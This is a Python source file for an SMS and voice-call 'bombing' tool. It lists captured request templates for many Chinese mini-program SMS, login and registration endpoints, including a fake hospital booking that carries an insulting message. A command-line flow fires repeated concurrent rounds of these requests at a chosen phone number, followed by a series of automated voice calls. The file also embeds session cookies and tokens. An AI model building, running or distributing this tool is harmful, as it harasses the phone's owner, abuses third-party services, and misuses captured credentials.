                "a4X4A2hbU0dVLcQm2LCy9OuQtFpV9S0wu6pSgtx8JN41%3D%22%2C%22e%22%3A%22cbFWvt9kexwpfxCybnUZIeRXz45AI-bGe5"
                "8D_qNbcmaHrS9W8frU1RtVpWNk_x6OKmDiaOmCDj54dYR_DJ9RspqEIDdNHNK5HUMU627XqqmfOR8E5TFJv32bOkU5rsK0uL94kY"
                "14W-TIhbX0kuKFAPh88DLPh6d509g_3Yca4XtnK9A4GT4Z9fixZrARvDomK9ichTMCJ4brC9lV3KiLNhZwuR_Njcgb3lv1fLasHE"
                "j3mIXbaXIS8qXt8wPlkyGQqBQtPXt9KBZtGtiogryxFUug5sRl8IKnUhzHY1aq4lbgL_dJz7qe5eBpCK0VEI0X0TZk9CYUEg01YT"
                "uvCMKFMuIknevhmPdD8bHW918-lSpCiNImoKrKVCuZjzOta_aLZ6AvmqZYXV2p-2jwyK3k5-MAVa2XVLqq6mUb2LMtaCGzFnEPsh"
                "o4Dj5ALMo32aVsOoLGymA9GsWPL4xkgVjHZ-Ll5Zvf59cs6ikTIPkaRQ0%22%2C%22i%22%3Atrue%7D"
            ),
        },
        "cookies": {
            "nodejs_sid": "s%3AJe330pDnPvmMafrtsgLGXZubqQg7Plv7.FB9kbFV89DrYQBJkYRb0UkaPNwzEQm5Trgd0yUlseOk",
            "fed-env": "production",
            "_qxc_token_": "eb81b40d-43f9-4bcf-8b57-bd165da4fad7",
            "hz_guest_key": "3x9a97LHUHZ4y3XPekPH_1754097046804_1_1015544_38625430",
            "_bl_uid": "j5mjkd0XtbvkC138scUCkhstU8yy",
            "merakApiSessionId": "ebb083327198781a0976uqPJu53NwsTZ",
            "MERAK_DEVICE_ID": "54826bc105b8826c0935c7ef9cb76101",
            "MERAK_RECALL_ID": "98b083327198781a0b76EQOm7F0i9Itv",
            "MERAK_SESSIONID_ID": "0ab083327198781a0b77ccweQE49Inxl",
            "token": "4de2157f-751a-4fef-9629-56be19d9366c",
            "acw_tc": "ac11000117543930671605244e17564aa24627b1ad4373f6c54dee62ac49a4",
            "beidou_mini_cross_state": (
                "%7B%22_beidouWxDistinctId%22%3A%221754393057537-3919538-085c85ad06848e-55739345%22%2C%22_beidouWxLog"
                "inId%22%3A%22%22%7D"
            ),
            "beidou_jssdk_session_id": "1754393069461-7502498-0eb149ad9e396b8-95476587",
            "beidoudata2015jssdkcross": (
                "%7B%22distinct_id%22%3A%221754393057537-3919538-085c85ad06848e-55739345%22%2C%22first_id%22%3A%22198"
                "6854db025b8-049c104f343d668-622e2a12-430320-1986854db03495%22%2C%22props%22%3A%7B%22%24search_keywor"
                "d%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24lates"
                "t_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%"
                "22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_"
                "referrer%22%3A%22%22%7D%2C%22session_id%22%3A%22%22%2C%22%24page_visit_id%22%3A%221754393057537-3919"
                "538-085c85ad06848e-55739345-1754393069466%22%2C%22%24device_id%22%3A%221986854db025b8-049c104f343d66"
                "8-622e2a12-430320-1986854db03495%22%2C%22sdk_injection%22%3A%22INJECTED%22%2C%22login_id%22%3A%22%22"
                "%2C%22login_Id%22%3A%22%22%7D"
            ),
            "MERAK_ENTER_PAGE_TIME": "1754393069682",
            "tfstk": (
                "g2om8HgG-vC00-sfodqXlxXJRhgMkoZ_UfIT6lFwz7PSD5FxQl-ihj4T3Gkasfc8NrF2llHa_7l_6iE25OugBRWV7GPVabDsBSnT"
                "HIwZZXGhXKgx6tgS9vSxDEZOjoZTbBdpvHBjhlZwz2sbHsNzIJtObSPacurhifEBvHHj3nDCGFxKXld0aRFabrz4UuP7I15q_rzP"
                "z7w_QsyN0LDzN7yN7-rw48ybp5PZ_lJoU7wab5lauLDzNRra_QcPuSN4M0Ri_aAKquQK2-40TxPqUXnzB6et37SOQ4y0otH4ZGSZ"
                "4VxVqnNw46Vs4fqUo0JOSWq7ZR2mmdQQ12eiQJqFpGkogbo380d5X5Szoa7EgnS_93D15Na4F8Vdpza-0R2e7OJkEwW_u8wr2Lvl"
                "5Na4F8VpELb3hry7U0C.."
            ),
        },
    },
    {
        "name": "mobilev2.atomychina.com.cn",
        "method": "POST",
        "url": "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code",
        "headers": {
            "Host": "mobilev2.atomychina.com.cn",
            "Connection": "keep-alive",
            "pragma": "no-cache",
            "cache-control": "no-cache",
            "Accept": "application/json",
            "x-requested-with": "XMLHttpRequest",
            "design-site-locale": "zh-CN",
            "Accept-Language": "zh-CN",
            "X-HTTP-REQUEST-DOMAIN": "mobilev2.atomychina.com.cn",
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx74d705d9fabf5b77/171/page-frame.html",
            "User-Agent": "__UA__",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "data": {"mobile": "__PHONE__", "captcha": "1111", "token": "1111", "prefix": 86},
        "cookies": {
            "acw_tc": "0b6e704217543973526363742e7228ce87cdcab16e6e1ce0c22c775c0bf455",
            "guestId": "f67b8c82-f6f4-4a2d-b857-70223098c12c",
            "guestId.sig": "cf36A-025BEBDTEeSi1ADFHYAHI",
        },
    },
    {
        "name": "wx.hy021.net",
        "method": "POST",
        "url": "https://wx.hy021.net/api/mb1001/guahao",
        "headers": {
            "Host": "wx.hy021.net",
            "Connection": "keep-alive",
            "appid": "1282a884-bde3-11ef-801e-b8cef617a30e",
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx7ac8f33f519ebaa2/1/page-frame.html",
            "User-Agent": "__UA__",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "data": {
            "data": {
                "type": 2,
                "name": "救赎",
                "age": "35",
                "phone": "__PHONE__",
                "detail": "脑子不正常好像是脑残了",
                "gender": "男",
                "sex": 1,
                "doctor": "牛玉权",
            },
            "appid": "1282a884-bde3-11ef-801e-b8cef617a30e",
        },
    },
    {
        "name": "blue.planplus.cn",
        "method": "POST",
        "url": "https://blue.planplus.cn/account/api/account/v1/member/sms/sendCode?mobile=__PHONE__",
        "headers": {
            "Host": "blue.planplus.cn",
            "Connection": "keep-alive",
            "x-user-token": (
                "TrpusLsAnnNeyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NTQ1Mjk3NzAsInRva2VuIjoie1wiZnJvbVwiOlwicGxhdGZvcm1cIixc"
                "Im9wZW5pZFwiOlwib3lLN3UwQXJMVGYybjRNR2oyc0tJYVBTX0hKd1wiLFwidW5pb25pZFwiOlwib0hlQ2NzLUFwSU05N1V2anc1"
                "a3prY1E1T3N0b1wifSJ9.o1o4upLSYY2tuiNcrJIG2r-F4DoUcw6YOana759BhzLPLmpRFXDrHKOvNPBDhijD1GKvu7vnc1MyL4B"
                "Hk0iEhA"
            ),
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wxd4c6c416bdab4315/51/page-frame.html",
            "User-Agent": "__UA__",
            "Accept-Encoding": "gzip, deflate, br",
        },
    },
    {
        "name": "shop.hfmsq.com",
        "method": "GET",
        "url": "https://shop.hfmsq.com/prod-api/sendMsg?phoneNumber=__PHONE__",
        "headers": {
            "Host": "shop.hfmsq.com",
            "User-Agent": "__UA__",
            "Referer": "https://servicewechat.com/wx848613725517fc02/2/page-frame.html",
        },
    },
]


#: 全部接口，按原脚本顺序拼接，主流程直接用它。
ALL_ENDPOINTS: list[Endpoint] = (
    MINIAPP_ENDPOINTS + EXTRA_ENDPOINTS + FLOW_ENDPOINTS + INSURANCE_ENDPOINTS
)

#: 语音呼叫接口：间隔较大，单独调用 send_voice_call()。
VOICE_CALL_ENDPOINT: Endpoint = {
    "name": "sdjuliangnet 语音呼叫",
    "method": "POST",
    "url": "https://job.sdjuliangnet.com/mengpinapiv2.php/index/sendvmsv2",
    "headers": {
        "Host": "job.sdjuliangnet.com",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "User-Agent": "mmm",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx71ca15a0ba7a5d0d/11/page-frame.html",
    },
    # ticket / randstr 会过期：重新抓包后只改这两处即可
    "data": (
        '{"type":1,"tel":"__PHONE__","ticket":"'
        "tr03iCvK4_tx9j01lj2Gmisv-F4Aj3K3gHN3TTvkHU3MF5ttlw_995xyRTDxi7GFtAdNlbIWULh6Ot5FY6KgzLsWvXljJVnnQD71mRJhKQ4FkPlJ_mV5Hk0Gj0bQIryrokNYFXNAjscydkxJtQTadyR12A**"
        '","randstr":"@oHt","sendSource":2,"userToken":null,"loginType":3,'
        '"channel":102,"app_id":7,"oaid":"uniapp","api_city":"","api_ip_city":""}'
    ),
}


# ============================================================================
# 11. 命令行与主流程
# ============================================================================
PHONE_PATTERN = re.compile(r"1[3-9]\d{9}")


def build_parser() -> argparse.ArgumentParser:
    """构造命令行参数解析器。"""
    parser = argparse.ArgumentParser(
        prog="小硕短信轰炸2.0",
        description="多接口并发短信发送（接口数据在文件第 10 节）",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("phone", nargs="?", help="目标手机号；不填则运行时提示输入")
    parser.add_argument("-r", "--rounds", type=int, default=DEFAULT_ROUNDS, help="发送轮数")
    parser.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS, help="并发线程数")
    parser.add_argument(
        "-t", "--timeout", type=float, default=DEFAULT_TIMEOUT, help="单请求超时（秒）"
    )
    parser.add_argument("-i", "--interval", type=float, default=0.0, help="轮与轮之间的间隔（秒）")
    parser.add_argument("-k", "--filter", default="", help="只跑名字/URL 含该关键字的接口")
    parser.add_argument("-n", "--limit", type=int, default=0, help="最多跑前 N 个接口（0=全部）")
    parser.add_argument(
        "--voice-times", type=int, default=DEFAULT_VOICE_TIMES, help="语音呼叫次数"
    )
    parser.add_argument(
        "--voice-interval", type=float, default=DEFAULT_VOICE_INTERVAL, help="语音呼叫间隔（秒）"
    )
    parser.add_argument("--no-voice", action="store_true", help="跳过语音呼叫环节")
    parser.add_argument("--no-banner", action="store_true", help="不打印启动横幅")
    parser.add_argument("--dry-run", action="store_true", help="只列接口，不发请求")
    parser.add_argument("--self-test", action="store_true", help="自检：哈希实现 + 接口数据")
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    return parser


def normalize_phone(raw: str | None) -> str | None:
    """清洗并校验手机号；不合法返回 None。"""
    digits = re.sub(r"\D", "", raw or "")
    if len(digits) == 13 and digits.startswith("86"):
        digits = digits[2:]
    return digits if PHONE_PATTERN.fullmatch(digits) else None


def prompt_phone() -> str | None:
    """交互式输入手机号，最多试 3 次。"""
    for _ in range(3):
        phone = normalize_phone(input(paint("请输入手机号码: ", "yellow")).strip())
        if phone:
            return phone
        error("手机号格式不对，需要 11 位、以 1 开头（例如 13800000000）")
    return None


def select_endpoints(keyword: str = "", limit: int = 0) -> list[Endpoint]:
    """按关键字 / 数量筛选接口。"""
    items: Sequence[Endpoint] = ALL_ENDPOINTS
    if keyword:
        needle = keyword.lower()
        items = [
            ep
            for ep in items
            if needle in str(ep.get("name", "")).lower() or needle in str(ep.get("url", "")).lower()
        ]
    return list(items[:limit] if limit > 0 else items)


def run_rounds(
    phone: str,
    endpoints: Sequence[Endpoint],
    args: argparse.Namespace,
) -> SendSummary:
    """跑完所有轮次，返回总汇总。"""
    overall = SendSummary()
    for round_index in range(1, args.rounds + 1):
        echo()
        echo(paint(f"========== 第 {round_index}/{args.rounds} 轮开始 ==========", "magenta", bold=True))
        summary = SendSummary()
        bar = progress(len(endpoints), desc=f"第 {round_index} 轮")

        def on_result(result: SendResult) -> None:
            summary.add(result)
            bar.update(1)
            bar.set_postfix_str(f"成功 {summary.success} 失败 {summary.failed}", refresh=False)

        try:
            results = send_round(
                endpoints,
                phone,
                workers=args.workers,
                timeout=args.timeout,
                on_result=on_result,
            )
        finally:
            bar.close()

        overall.merge(results)
        echo(summary.render(f"第 {round_index} 轮结束"), "green")

        if round_index < args.rounds and args.interval > 0:
            time.sleep(args.interval)
    return overall


def run_voice(phone: str, args: argparse.Namespace) -> SendSummary:
    """语音呼叫环节。"""
    summary = SendSummary()
    echo()
    info(f"开始语音呼叫：{args.voice_times} 次，间隔 {args.voice_interval:g} 秒")
    bar = progress(args.voice_times, desc="语音呼叫")

    def on_result(result: SendResult) -> None:
        summary.add(result)
        bar.update(1)

    try:
        results = send_voice_call(
            VOICE_CALL_ENDPOINT,
            phone,
            times=args.voice_times,
            interval=args.voice_interval,
            on_result=on_result,
        )
    finally:
        bar.close()

    if results:
        success(f"语音呼叫完成：成功 {summary.success}，失败 {summary.failed}")
    return summary


def print_endpoint_table(endpoints: Sequence[Endpoint], phone: str | None = None) -> None:
    """--dry-run：列出将要请求的接口（用示例号码看真实 URL）。"""
    sample = phone or "13800000000"
    stamp = str(int(time.time()))
    info(f"共 {len(endpoints)} 个接口（URL 里的占位符按 {sample} 预览）：")
    for index, endpoint in enumerate(endpoints, start=1):
        method = str(endpoint.get("method", "?")).upper().ljust(4)
        name = str(endpoint.get("name", "?"))
        url = fill_placeholders(
            str(endpoint.get("url", "")), sample, user_agent="<UA>", timestamp=stamp
        )
        echo(f"  {index:>3}. {paint(method, 'cyan')} {paint(name, 'green')} → {url}")


def self_test() -> int:
    """自检：哈希实现 + 接口数据格式。"""
    crypto_self_check()
    success("哈希 / 编码实现与标准库一致")

    problems = []
    for index, endpoint in enumerate(ALL_ENDPOINTS, start=1):
        if not endpoint.get("url") or not endpoint.get("method"):
            problems.append(f"第 {index} 条缺少 method/url")
            continue
        body = endpoint.get("data")
        if isinstance(body, str) and body.startswith("{"):
            try:
                json.loads(body.replace(PHONE_TOKEN, "13800000000"))
            except json.JSONDecodeError:
                problems.append(f"第 {index} 条 data 不是合法 JSON: {endpoint.get('name')}")
    if problems:
        for problem in problems:
            error(problem)
        return 1
    success(f"接口数据检查通过：{len(ALL_ENDPOINTS)} 条 + 语音 1 条")
    return 0


def run(args: argparse.Namespace) -> int:
    """执行一次完整流程。"""
    ensure_dependencies()
    if args.self_test:
        return self_test()

    if not args.no_banner:
        print_banner(animated=sys.stdout.isatty())

    endpoints = select_endpoints(args.filter, args.limit)
    if not endpoints:
        error("没有匹配到任何接口，检查 --filter / --limit 参数")
        return 2

    if args.dry_run:
        print_endpoint_table(endpoints, normalize_phone(args.phone))
        return 0

    phone = normalize_phone(args.phone) or prompt_phone()
    if not phone:
        error("未能获得有效手机号，退出")
        return 2

    info(
        f"目标号码 {paint(phone, 'yellow', bold=True)}｜接口 {len(endpoints)} 个｜"
        f"{args.rounds} 轮｜并发 {args.workers}｜超时 {args.timeout:g}s"
    )

    overall = run_rounds(phone, endpoints, args)
    if not args.no_voice:
        overall.combine(run_voice(phone, args))

    echo()
    echo(paint(overall.render("全部任务完成"), "cyan", bold=True))
    return 0


def main(argv: Sequence[str] | None = None) -> int:
    """主入口：解析参数 → 校验 → 执行。"""
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.rounds < 1:
        parser.error("--rounds 至少为 1")
    if args.workers < 1:
        parser.error("--workers 至少为 1")
    if args.timeout <= 0:
        parser.error("--timeout 必须大于 0")

    try:
        return run(args)
    except KeyboardInterrupt:
        warn("已手动中断")
        return 130

# ============================================================================
# 12. 入口
# ============================================================================
if __name__ == "__main__":
    raise SystemExit(main())
